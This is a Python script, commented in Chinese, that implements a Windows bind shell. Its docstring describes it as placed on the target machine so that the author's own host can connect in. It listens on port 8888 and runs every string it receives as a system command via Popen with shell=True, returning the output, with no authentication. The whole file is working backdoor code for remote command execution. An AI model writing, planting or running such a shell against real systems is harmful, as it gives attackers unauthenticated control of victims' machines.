# -*- coding: utf-8 -*-
"""
Windows下的正向shell（server再目标机器， client是我的主机，再我的主机上连接这个server）
这个文件放在服务器端（windows系统）
"""

import socket
import sys
from subprocess import Popen, PIPE     # 执行系统命令

HOST = ''   # 如果是本机最为服务端，地址可以不用填写
PORT = 8888
BUFSIZE = 10240
ADDR = (HOST, PORT)
tcp_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   # type默认是tcp
tcp_server.bind(ADDR)
tcp_server.listen(5)
print("开始监听")

while True:
    # 服务端和客户端的循环连接
    print("Waiting fpr connecting...")
    coon, addr = tcp_server.accept()  #
    print("... connected from:" + str(addr))
    # 下面是通信的循环
    while True:
        data = coon.recv(BUFSIZE)
        data = data.decode('gbk')
        if data:
            try:
                # 执行获取服务端的系统命令（在客户端连接后可以执行服务端的命令）
                cmd = Popen(data, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
                cmd_data, cmd_err = cmd.communicate()
                if cmd_err:
                    coon.send(cmd_err)
                coon.send(cmd_data)
                print(cmd_data.decode('gbk'))
            except Exception:
                continue

        else:
            print("客户端{}已断开".format(addr))
            break

